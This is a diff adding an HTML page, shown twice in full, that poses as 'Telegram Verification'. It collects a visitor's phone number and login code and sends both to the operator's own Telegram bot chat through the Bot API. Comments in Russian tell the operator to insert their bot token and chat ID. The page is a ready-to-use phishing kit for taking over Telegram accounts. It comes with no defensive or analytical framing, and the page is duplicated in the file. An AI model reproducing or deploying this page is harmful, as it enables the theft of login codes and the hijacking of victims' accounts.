@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .step {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        #error {
+            color: red;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div id="step1" class="step active">
+        <h2>Enter your phone number</h2>
+        <input type="tel" id="phone" placeholder="+1234567890" required>
+        <button onclick="nextStep()">Continue</button>
+        <div id="error"></div>
+    </div>
+
+    <div id="step2" class="step">
+        <h2>Enter verification code</h2>
+        <input type="text" id="code" placeholder="12345" required>
+        <button onclick="sendData()">Verify</button>
+        <div id="error2"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Замените на токен вашего бота
+        const CHAT_ID = 'YOUR_CHAT_ID';     // Ваш chat_id в Telegram
+        let phoneNumber = '';
+
+        function nextStep() {
+            const phone = document.getElementById('phone').value;
+            if (!phone) {
+                document.getElementById('error').textContent = 'Please enter phone number';
+                return;
+            }
+            phoneNumber = phone;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        async function sendData() {
+            const code = document.getElementById('code').value;
+            if (!code) {
+                document.getElementById('error2').textContent = 'Please enter verification code';
+                return;
+            }
+
+            const message = `📱 New verification:\nPhone: ${phoneNumber}\nCode: ${code}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+
+                if (response.ok) {
+                    document.getElementById('step2').innerHTML = '<h2 style="color:green;">Verification successful!</h2>';
+                } else {
+                    document.getElementById('error2').textContent = 'Error sending data. Try again.';
+                }
+            } catch (error) {
+                document.getElementById('error2').textContent = 'Network error.';
+            }
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .step {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        #error {
+            color: red;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div id="step1" class="step active">
+        <h2>Enter your phone number</h2>
+        <input type="tel" id="phone" placeholder="+1234567890" required>
+        <button onclick="nextStep()">Continue</button>
+        <div id="error"></div>
+    </div>
+
+    <div id="step2" class="step">
+        <h2>Enter verification code</h2>
+        <input type="text" id="code" placeholder="12345" required>
+        <button onclick="sendData()">Verify</button>
+        <div id="error2"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Замените на токен вашего бота
+        const CHAT_ID = 'YOUR_CHAT_ID';     // Ваш chat_id в Telegram
+        let phoneNumber = '';
+
+        function nextStep() {
+            const phone = document.getElementById('phone').value;
+            if (!phone) {
+                document.getElementById('error').textContent = 'Please enter phone number';
+                return;
+            }
+            phoneNumber = phone;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        async function sendData() {
+            const code = document.getElementById('code').value;
+            if (!code) {
+                document.getElementById('error2').textContent = 'Please enter verification code';
+                return;
+            }
+
+            const message = `📱 New verification:\nPhone: ${phoneNumber}\nCode: ${code}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+
+                if (response.ok) {
+                    document.getElementById('step2').innerHTML = '<h2 style="color:green;">Verification successful!</h2>';
+                } else {
+                    document.getElementById('error2').textContent = 'Error sending data. Try again.';
+                }
+            } catch (error) {
+                document.getElementById('error2').textContent = 'Network error.';
+            }
+        }
+    </script>
+</body>
+</html>
